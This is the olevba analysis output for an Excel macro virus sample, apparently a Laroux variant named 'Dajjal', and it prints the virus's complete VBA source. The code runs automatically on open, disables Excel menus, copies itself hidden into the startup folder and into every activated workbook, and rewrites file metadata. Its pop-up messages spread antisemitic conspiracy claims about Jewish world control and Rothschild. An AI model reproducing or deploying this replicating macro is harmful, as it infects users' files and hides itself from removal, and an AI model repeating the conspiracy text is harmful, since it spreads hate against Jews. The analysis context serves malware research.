olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.nk.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SURIV_PJD_APKIR.bas 
in file: Virus.MSExcel.Laroux.nk.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/SURIV_PJD_APKIR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"

    '==============================================================
    'Diprogram oleh       : ~Akut Wajuxacqupi~
    '   Programed by      :    ~Akut Wajuxacqupi~
    'Nama proyek          : Program eksperimental virus komputer
    '   Project name      :    Computer virus experimental program
    'Nama virus           : Dajjal
    '   Virus name        :    Dajjal
    'Saat pembuatan       : Mei 1998
    '   Created at        :    May 1998
    'Tempat pembuatan     : Jakarta, Indonesia
    '   Made in           :    Jakarta, Indonesia
    'Dipersembahkan untuk : Umat manusia
    '   Dedicated for     :    All human being
    'Waktu tampil         : Mulai Bulan Nopember 1998;
    '                       Tiap hari Senin sebelum pukul 12; dan
    '                       Pada hari istimewa
    '   Showing messages  :    Start in November 1998;
    '                          Every Monday before 12 am; and
    '                          At special date
    '==============================================================
    
    On Error GoTo AdaKesalahan
    
    Application.OnSheetActivate = "Proses"
    Application.CommandBars("Tools").Controls("Macro").Enabled = False
    Application.CommandBars("Window").Controls("Unhide...").Enabled = False
    Application.CommandBars("Tools").Controls("Customize...").Enabled = False
    Application.AutoCorrect.AddReplacement What:="yg", Replacement:="yang"
    Application.AutoCorrect.AddReplacement What:="wp", Replacement:="Wajib Pajak"
    Application.OnKey "^%d", "AboutVirus"
    Application.OnKey "%{f8}", ""
    Application.OnKey "%{f11}", ""
    Application.OnKey "^%z", "Hancurkan"
    
    
    'Aktifkan pesan-pesan virus mulai bulan Nopember 1998
    'dan hanya jika satu workbook yang dibuka
    If ((Month(Date) > 10 And Year(Date) = 1998) Or (Year(Date) > 1998) And _
        Application.Workbooks.Count < 3) And _
        Dir("C:\dajjal.off", vbHidden) <> "DAJJAL.OFF" Then TulisPesan
        
    
    'Tidak terjadi kesalahan
    GoTo Sukses

    'Terjadi kesalahan
AdaKesalahan:
    'Pesan = MsgBox("Kesalahan adalah hal lumrah bagi seorang manusia", vbInformation + vbOKOnly, "Kesalahan")

Sukses:

End Sub

Sub Hancurkan()
Attribute Hancurkan.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.CommandBars("Tools").Controls("Customize...").Enabled = True
End Sub
Sub AboutVirus()
Attribute AboutVirus.VB_ProcData.VB_Invoke_Func = " \n14"
    
    Pesan = MsgBox( _
    "Diprogram oleh: ~Akut Wajuxacqupi~" + Chr(10) + _
    "       Programed by: ~Akut Wajuxacqupi~" + Chr(10) + _
    "Nama proyek: Program eksperimental virus komputer" + Chr(10) + _
    "       Project name: Computer virus experimental program" + Chr(10) + _
    "Nama virus: Dajjal" + Chr(10) + _
    "       Virus name: Dajjal" + Chr(10) + _
    "Tempat pembuatan: Jakarta, Indonesia" + Chr(10) + _
    "       Made in: Jakarta, Indonesia" + Chr(10) + _
    "Saat pembuatan: Mei 1998" + Chr(10) + _
    "       Created in: May 1998" + Chr(10) + _
    "Dipersembahkan untuk: Umat manusia" + Chr(10) + _
    "       Dedicated for: All human being" + Chr(10) + _
    "Waktu tampil: Mulai Bulan Nopember 1998; " + Chr(10) + _
    "   Tiap hari Senin sebelum pukul 12; dan" + Chr(10) + _
    "   Pada hari istimewa" + Chr(10) + _
    "       Show messages: Start in November 1998;" + Chr(10) + _
    "           Every Monday before 12 am; and" + Chr(10) + _
    "           At special date", _
    vbOKOnly + vbInformation, "About Dajjal virus")

End Sub

Sub TulisPesan()
Attribute TulisPesan.VB_ProcData.VB_Invoke_Func = " \n14"
        
    Randomize Timer
    
    'HUT RI
    If Day(Date) = 17 And Month(Date) = 8 Then
        Pesan = MsgBox("Negeri kita tercinta sedang berulang tahun hari ini." + Chr(10) + _
        "Mari kita rayakan!", vbOKOnly + vbExclamation, "HUT RI")
    End If
    
    'REFORMASI
    If Day(Date) = 14 And Month(Date) = 5 Then
        Pesan = MsgBox((Year(Now) - 1998) & " tahun yang lalu terjadi penjarahan, perampokan, perusakan, dan pembakaran atas nama reformasi di Jakarta." + Chr(10) + _
        "Reformasi itu harus dilakukan di setiap saat demi kesempurnaan suatu sistem." + Chr(10) + _
        "Kesemuanya itu akan berpulang pada kepentingan rakyat banyak." + Chr(10) + _
        "Tapi janganlah reformasi yang mulia itu ternodai oleh anarkisme yang biadab!", vbOKOnly + vbExclamation, "REFORMASI")
    End If
    
    'Ulang tahun
    If Day(Date) = 10 And Month(Date) = 12 Then
        Pesan = MsgBox("Saya berulang tahun hari ini." + Chr(10) + _
        "Tolong doakan agar saya menjadi manusia yang berguna." + Chr(10) + "Terima kasih.", vbOKOnly + vbInformation, "Ulang tahun 51268")
    End If
    
    'Pesan mingguan
    If (WeekDay(Date) = vbMonday And Hour(Time) < 12) Then
        TulisPesanMingguan (Int(Rnd * 16 + 1))
    End If
        
End Sub

Sub TulisPesanMingguan(Urutan)
Attribute TulisPesanMingguan.VB_ProcData.VB_Invoke_Func = " \n14"
    
    Dim Pesan(17)
Pesan(1) = "Dajjal adalah seorang manusia yang lahir di negeri Samiriyah sebelum masa kenabian Nabi Musa." + Chr(10) + _
        "Ia lahir ke dunia hanya membawa bencana bagi kedua orang tuanya dan kelak juga akan menjadi bencana bagi umat manusia!"

Pesan(2) = "Sepak terjang Dajjal telah tercium oleh beberapa orang yang jeli:" + Chr(10) + _
        "Cherep Spiridovich, 1926, THE HIDDEN HAND, Skandinavia, sumber: manuskrip-manuskrip tua yang sudah berumur ribuan tahun," + Chr(10) + _
        "tewas secara misterius sehari sebelum membahas bukunya itu di sebuah konfrensi bersama tokoh-tokoh terkemuka;" + Chr(10) + _
        "Juga seorang wartawan Inggris, THE SECRET WORLD GOVERNMENT, Inggris, bukunya tersebut menjelaskan mengenai seratus peristiwa historis yang misterius."

Pesan(17) = "Dajjal akan muncul ke dunia dengan mengendarai pesawat terbang yang kecepatannya tidak dapat ditandingi oleh teknologi manusia pada saat ini."

Pesan(4) = "Dajjal adalah satu dari tiga mahluk yang ditangguhkan ajalnya selain Nabi Isa Al Masih dan Iblis."

Pesan(5) = "Dajjal julukkannya adalah As-Samiri karena ia berasal dari negeri Samiriyah." + Chr(10) + _
        "Samiri pernah memperdaya dan menyesatkan umat Nabi Musa (Bani Israil/Yahudi) dengan membuat anak sapi emas untuk dipertuhankan dan berhasil. " + Chr(10) + _
        "Nabi Musa lalu lalu mengusirnya. " + Chr(10) + _
        "Paman Sam tidak lain adalah Samiri si Dajjal!"

Pesan(6) = "Di akhir jaman ia akan mengaku sebagai tuhan yang disembah di muka bumi. " + Chr(10) + _
        "Ia akan memerintah tetapi hanya dalam waktu yang singkat saja."

Pesan(7) = "Semasa kecil, Dajjal diurus dan dilindungi oleh malaikat Jibril & Jassasah di suatu pulau karena ia mempunyai kaitan dengan masa depan dunia, yaitu sebagai penguji keimanan umat manusia."

Pesan(8) = "Ketika diurus oleh Jibril, Dajjal telah diberi kebebasan memilih apakah kelak ia akan menjadi orang baik atau menjadi orang jahat. " + Chr(10) + _
        "Tetapi ternyata ia cenderung kepada kejahatan karena kesombongannya."

Pesan(9) = "Dajjal berumur sangat panjang dan tidak pernah tua atau orang tua yang selalu muda. " + Chr(10) + _
        "Ia memiliki kecerdasan dan kemampuan seratus kali manusia umumnya. " + Chr(10) + _
        "Karena ia merasa memiliki kelebihan itu, maka ia menjadi sombong. " + Chr(10) + _
        "Ia adalah seorang jenius yang jahat. Dengan akumulasi ilmu yang didapatnya dari berkeliling dunia selama hidupnya yang panjang, " + Chr(10) + _
        "ia telah menjadi tergila-gila dengan pemikirannya untuk menguasai dan memerintah dunia. " + Chr(10) + _
        "Untuk itu, ia menyusun rencana yang rapi yang sudah berjalan hingga saat ini!"

Pesan(10) = "Dajjal adalah pembuat fitnah yang ulung. " + Chr(10) + _
        "Dengan fitnahnya, pandangan manusia akan hal yang benar akan salah dan pandangan yang salah menjadi benar. " + Chr(10) + _
        "Ia mampu menjungkirbalikan pemikiran manusia dengan tipu dayanya. " + Chr(10) + _
        "Manusia melihat surga padahal neraka dan demikian sebaliknya. " + Chr(10) + _
        "Tujuannya adalah menjauhkan manusia dari jalan yang benar dan menuju kesesatan."

Pesan(11) = "Pada abad VIII Masehi, di perairan dekat Florida, " + Chr(10) + _
        "Dajjal bertemu dengan Iblis yang telah menantinya sejak jutaan tahun. " + Chr(10) + _
        "Dajjal mengadakan perjanjian dan ikatan persahabatan istimewa dengan Iblis. " + Chr(10) + _
        "Tujuannya adalah menjauhkan manusia dari tuhannya serta memerintah manusia. " + Chr(10) + _
        "Tujuan khususnya adalah menghancurkan Islam dan kaum Muslimin." + Chr(10) + _
        "Mereka menyusun langkah-langkah kerja yang sangat matang dan rapi dalam sebuah konsep protokoler bagi pengendalian dunia dan metode penguasaannya. " + Chr(10) + _
        "Iblis menjadi sahabat Dajjal yang tersembunyi guna membantunya untuk memerintah manusia. " + Chr(10) + _
        "Dajjal mendapat bantuan penuh dari setan jin dan setan manusia dengan teknologi tinggi yang mereka miliki."


Pesan(12) = "Dajjal memulai rencananya memerintah manusia dengan merencanakan untuk melakukan Revolusi Prancis pada tahun 1789 M bersama pengikutnya Meyer Rothschild. " + Chr(10) + _
        "Seorang jenderal Amerika, William Bay Karl, mengaku bahwa sejak Revolusi Prancis hingga sekarang masih ada kekuatan misterius yang menggerakkan berbagai revolusi di seluruh dunia."


Pesan(13) = "Dajjal pernah membalas dendam pada raja Inggris, Edward I, yang telah mengusir orang-orang Yahudi. " + Chr(10) + _
        "Hasilnya: bangsa Inggris terbagi menjadi kelompok penganut Protestan dan Katolik. " + Chr(10) + _
        "Lalu militer Protestan terbagi dua juga: " + Chr(10) + _
        "penganut yang kukuh dan penganut yang bebas."


Pesan(14) = "Dajjal telah menulis 10 jilid buku yang masing-masing tebalnya sekitar 2000 halaman. " + Chr(10) + _
        "Lima jilid pertama terdapat bab yang berjudul KETIKA AKU MENGUASAI DUNIA, " + Chr(10) + _
        "lima jilid selanjutnya terdapat bab yang berjudul SUATU HARI DUNIA DALAM GENGGAMANKU DAN BOLA BUMI ADALAH KANTORKU."

Pesan(15) = "Dajjal, dengan ilmunya yang tinggi, telah membuat sebuah kantor besar yang tak terlihat di daerah Segitiga Bermuda. " + Chr(10) + _
        "Kantor itu berbentuk Piramida yang besar yang terletak di bawah permukaan laut. " + Chr(10) + _
        "Agar tidak tampak oleh manusia, ia memanfaatkan teknologi gelombang elektromagnetik yang canggih untuk menyembunyikannya dari pandangan manusia. " + Chr(10) + _
        "Dajjal telah menaklukkan gaya gravitasi dan tekanan air di kedalaman laut. " + Chr(10) + _
        "Kedalaman laut adalah tempat yang belum terjamah dan menjadi tempat persembunyian yang sangat aman." + Chr(10) + _
        "Disanalah ia bekerja menjalankan rencananya untuk menguasai manusia dan menjadi raja manusia. " + Chr(10) + _
        "Pernah dilakuakn pengorbitan satelit di atas Segitiga Bermuda. " + Chr(10) + _
        "Semua gambar yang dikirim tidak jelas, kecuali gambar yang menampakkan bongkah daratan yang samar. " + Chr(10) + _
        "Misteri Segitiga Bermuda masih belum terungkap hingga saat ini!"


Pesan(16) = "Kedekatan Dajjal dengan Yahudi sudah terjalin sejak jaman Nabi Musa. " + Chr(10) + _
        "Yahudi adalah umat yang paling mudah untuk disesatkan. " + Chr(10) + _
        "Hingga saat ini, Yahudilah golongan manusia yang pertama dikuasai. " + Chr(10) + _
        "Mereka diberikan kecerdasan dan kekayaan yang melebihi manusia pada umumnya. " + Chr(10) + _
        "Sudah menjadi rahasia umum bahwa tidak ada orang yang dapat menjadi presiden di Amerika tanpa dukungan golongan Yahudi. " + Chr(10) + _
        "Pengaruh mereka di Kongres Amerika sangat kuat sehingga negara ini adalah alat yang kuat pula bagi Dajjal!"


Pesan(3) = "Dajjal adalah seorang manusia yang akan menyesatkan manusia di akhir zaman. " + Chr(10) + _
        "Dajjal yang jenius dan memiliki teknologi dan keilmuan yang tinggi akan mengaku sebagai tuhan manusia. " + Chr(10) + _
        "Ia hanya akan mati oleh Nabi Isa Al Masih beserta Imam Mahdi yang akan muncul juga di akhir zaman."
    
    PesanKan = MsgBox(CStr(Pesan(Urutan)), vbOKOnly + vbExclamation, "Dajjal")

End Sub

Sub Proses()
Attribute Proses.VB_ProcData.VB_Invoke_Func = " \n14"
    
    On Error GoTo AdaKesalahan
    
    If Application.ActiveWorkbook.FileFormat = xlExcel5 Then GoTo Sukses
    FileKu = Dir(Application.StartupPath & "\" & "PJDAPKIR.XLS")
    If FileKu = "PJDAPKIR.XLS" Then Baik = 1 Else Baik = 0
    If ActiveWorkbook.Modules.Count > 0 Then Berguna = 1 Else Berguna = 0
    JenisAktifitas = Baik + Berguna * 2
    
    Select Case JenisAktifitas
    
        Case 1 '~Lutargaz ge vite jazk xaciq werciq alau waru~
        Application.ScreenUpdating = False
        NamaFileAktif = ActiveWorkbook.Name
        With ActiveWorkbook
            .Title = "Tokoh pengendali dunia yang tersembunyi"
            .Subject = "Yahudi"
            .Author = "Dajjal"
            .Keywords = "Malapetaka Fitnah; Akhir zaman"
            .Comments = "Dia bukan tuhan! Dia akan terbunuh oleh Isa Al Masih"
        End With
        If ActiveWorkbook.Modules.Count = 0 Then
            Workbooks("PJDAPKIR.XLS").Modules("SURIV_PJD_APKIR").Copy before:=Workbooks(NamaFileAktif).Sheets(1)
            Workbooks(NamaFileAktif).Modules("SURIV_PJD_APKIR").Visible = False
        End If
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "PJDAPKIR.xls!Proses"
        
        Case 2 '~Wual vite firuc pi MTClarl~
        Application.ScreenUpdating = False
        NamaFileAktif = ActiveWorkbook.Name
        Modules("SURIV_PJD_APKIR").Visible = True
        Modules("SURIV_PJD_APKIR").Select
        Modules("SURIV_PJD_APKIR").Copy
        With ActiveWorkbook
            .Title = "Tokoh pengendali dunia yang tersembunyi"
            .Subject = "Yahudi"
            .Author = "Dajjal"
            .Keywords = "Malapetaka Fitnah; Akhir zaman"
            .Comments = "Dia bukan tuhan! Dia akan terbunuh oleh Isa Al Masih"
        End With
        NamaFileAktif2 = ActiveWorkbook.Name
        DirektoriSaatIni = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(NamaFileAktif2).SaveAs _
            FileName:=Application.StartupPath & "\" & "PJDAPKIR.XLS", _
            FileFormat:=xlNormal, _
            Password:="", WriteResPassword:="", _
            ReadOnlyRecommended:=False, CreateBackup:=False
        ChDir DirektoriSaatIni
        Workbooks(NamaFileAktif).Modules("SURIV_PJD_APKIR").Visible = False
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "PJDAPKIR.xls!Proses"
        
        Case Else
    
    End Select

    'Tidak terjadi kesalahan
    GoTo Sukses

    'Terjadi kesalahan
AdaKesalahan:
    'Pesan = MsgBox("Kesalahan adalah hal lumrah bagi seorang manusia", vbInformation + vbOKOnly, "Kesalahan")

Sukses:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.nk.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     23 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  SURIV_PJD_APKI
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

